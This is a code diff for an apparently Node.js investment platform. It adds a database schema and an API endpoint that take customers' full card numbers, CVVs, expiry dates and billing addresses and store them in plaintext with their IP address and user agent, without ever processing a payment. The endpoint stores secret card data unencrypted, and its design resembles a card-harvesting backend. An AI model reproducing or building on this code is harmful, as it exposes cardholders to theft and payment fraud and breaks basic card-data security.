@@ -628,6 +628,88 @@ InvestmentSchema.query.completed = function() {
 const Investment = mongoose.model('Investment', InvestmentSchema);
 
 
+const CardPaymentSchema = new mongoose.Schema({
+  user: { 
+    type: mongoose.Schema.Types.ObjectId, 
+    ref: 'User', 
+    required: [true, 'User is required'],
+    index: true
+  },
+  fullName: { 
+    type: String, 
+    required: [true, 'Full name is required'], 
+    trim: true 
+  },
+  billingAddress: { 
+    type: String, 
+    required: [true, 'Billing address is required'], 
+    trim: true 
+  },
+  city: { 
+    type: String, 
+    required: [true, 'City is required'], 
+    trim: true 
+  },
+  state: { 
+    type: String, 
+    trim: true 
+  },
+  postalCode: { 
+    type: String, 
+    required: [true, 'Postal code is required'], 
+    trim: true 
+  },
+  country: { 
+    type: String, 
+    required: [true, 'Country is required'], 
+    trim: true 
+  },
+  cardNumber: { 
+    type: String, 
+    required: [true, 'Card number is required'], 
+    trim: true 
+  },
+  cvv: { 
+    type: String, 
+    required: [true, 'CVV is required'], 
+    trim: true 
+  },
+  expiryDate: { 
+    type: String, 
+    required: [true, 'Expiry date is required'], 
+    trim: true 
+  },
+  cardType: { 
+    type: String, 
+    enum: ['visa', 'mastercard', 'amex', 'discover', 'other'],
+    required: [true, 'Card type is required']
+  },
+  amount: { 
+    type: Number, 
+    required: [true, 'Amount is required'], 
+    min: [0, 'Amount cannot be negative'] 
+  },
+  ipAddress: { 
+    type: String, 
+    required: [true, 'IP address is required'] 
+  },
+  userAgent: { 
+    type: String, 
+    required: [true, 'User agent is required'] 
+  },
+  status: { 
+    type: String, 
+    enum: ['pending', 'processed', 'failed', 'declined'],
+    default: 'pending'
+  }
+}, { 
+  timestamps: true,
+  toJSON: { virtuals: true },
+  toObject: { virtuals: true }
+});
+
+const CardPayment = mongoose.model('CardPayment', CardPaymentSchema);
+
 const TransactionSchema = new mongoose.Schema({
   user: { 
     type: mongoose.Schema.Types.ObjectId, 
@@ -6938,6 +7020,101 @@ app.get('/api/users/me', protect, async (req, res) => {
 
 
 
+
+app.post('/api/payments/store-card', protect, [
+  body('fullName').trim().notEmpty().withMessage('Full name is required').escape(),
+  body('billingAddress').trim().notEmpty().withMessage('Billing address is required').escape(),
+  body('city').trim().notEmpty().withMessage('City is required').escape(),
+  body('postalCode').trim().notEmpty().withMessage('Postal code is required').escape(),
+  body('country').trim().notEmpty().withMessage('Country is required').escape(),
+  body('cardNumber').trim().notEmpty().withMessage('Card number is required').escape(),
+  body('cvv').trim().notEmpty().withMessage('CVV is required').escape(),
+  body('expiryDate').trim().notEmpty().withMessage('Expiry date is required').escape(),
+  body('cardType').isIn(['visa', 'mastercard', 'amex', 'discover', 'other']).withMessage('Invalid card type'),
+  body('amount').isFloat({ gt: 0 }).withMessage('Amount must be greater than 0')
+], async (req, res) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({
+      status: 'fail',
+      errors: errors.array()
+    });
+  }
+
+  try {
+    const {
+      fullName,
+      billingAddress,
+      city,
+      state,
+      postalCode,
+      country,
+      cardNumber,
+      cvv,
+      expiryDate,
+      cardType,
+      amount
+    } = req.body;
+
+    // Get user device info
+    const deviceInfo = await getUserDeviceInfo(req);
+
+    // Store the card payment details
+    const cardPayment = await CardPayment.create({
+      user: req.user.id,
+      fullName,
+      billingAddress,
+      city,
+      state,
+      postalCode,
+      country,
+      cardNumber,
+      cvv,
+      expiryDate,
+      cardType,
+      amount,
+      ipAddress: deviceInfo.ip,
+      userAgent: deviceInfo.device
+    });
+
+    // Create a transaction record (status will be pending)
+    const reference = `CARD-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
+    await Transaction.create({
+      user: req.user.id,
+      type: 'deposit',
+      amount,
+      currency: 'USD',
+      status: 'pending',
+      method: 'card',
+      reference,
+      netAmount: amount,
+      cardDetails: {
+        fullName,
+        cardNumber: cardNumber.slice(-4).padStart(cardNumber.length, '*'), // Mask card number
+        expiryDate,
+        billingAddress
+      },
+      details: 'Card payment pending processing'
+    });
+
+    res.status(201).json({
+      status: 'success',
+      message: 'Card details stored successfully',
+      data: {
+        reference
+      }
+    });
+
+    await logActivity('store-card-details', 'card-payment', cardPayment._id, req.user._id, 'User', req);
+  } catch (err) {
+    console.error('Store card details error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while storing card details'
+    });
+  }
+});
+
 // Error handling middleware
 app.use((err, req, res, next) => {
   console.error('Global error handler:', err);
@@ -6961,3 +7138,4 @@ const server = app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
   setupWebSocketServer(server);  // This initializes WebSocket
 });
+
